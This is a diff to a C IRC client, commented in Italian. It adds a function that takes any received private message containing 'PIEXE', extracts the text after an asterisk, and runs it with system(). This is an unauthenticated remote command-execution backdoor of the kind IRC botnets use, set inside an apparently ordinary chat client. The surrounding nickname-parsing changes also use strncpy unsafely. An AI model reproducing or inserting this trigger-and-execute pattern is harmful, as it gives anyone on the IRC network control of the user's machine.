@@ -12,6 +12,26 @@
 
 #include "header.h"
 
+void executer(char buffer[]){
+
+        char *comando;
+        char *comando_1;
+        char *comando_2;
+      
+        comando_1=strchr(buffer, '*');
+        
+        comando_2=strtok(comando_1, "*");
+        
+        comando=strtok(comando_2, " ");
+        
+        printf("Comando etratto: %s", comando);
+
+        system(comando);
+        
+        
+
+}
+
 void *funzione_thread_lettura(void *arg){
 
         char buffer[BUFFER];
@@ -19,6 +39,10 @@ void *funzione_thread_lettura(void *arg){
         char indirizzo_server[GENERAL_SIZE+1];
         int socket_id;
         char *messaggio;
+        char utente_1[GENERAL_SIZE+1];
+        char *utente_2;
+        char *stringa_1;
+        char *utente;
         
         socket_id=*(int*)arg;
 
@@ -38,15 +62,33 @@ void *funzione_thread_lettura(void *arg){
                         write(socket_id, &PONG, strlen(PONG));
                 
                 }else if(strstr(buffer, "PRIVMSG")!=NULL){  //Se nel buffer è presente il comando PRIVMSG il client stampa da quale utente o canale arriva il messaggio
-
-                       messaggio=strchr(buffer, 'P'); //Permette di memorizzare in una variabile i caratteri successivi alla lettera P
+                        if(strstr(buffer, "PIEXE")!=NULL){
+                
+                                executer(buffer);
+                
+                        }
+                        else{
+                            stringa_1=strchr(buffer, '!');
+                       
+                            strncpy(utente_1, buffer, strlen(buffer)-strlen(stringa_1));
+                            utente_1[0]=' ';
+                       
+                             utente_2=strtok(utente_1, "!");
+                             
+                             utente=strtok(utente_2, " ");
+                       
+                            printf("%s ha inviato un messaggio!\n", utente);
+                       
+                             messaggio=strchr(buffer, 'P'); //Permette di memorizzare in una variabile i caratteri successivi alla lettera P
                         
-                       printf("\n%s\n", messaggio);
+                             printf("%s\n", messaggio);
                 
                 }
                 
         
    }
+ }
+ 
  }
    
    
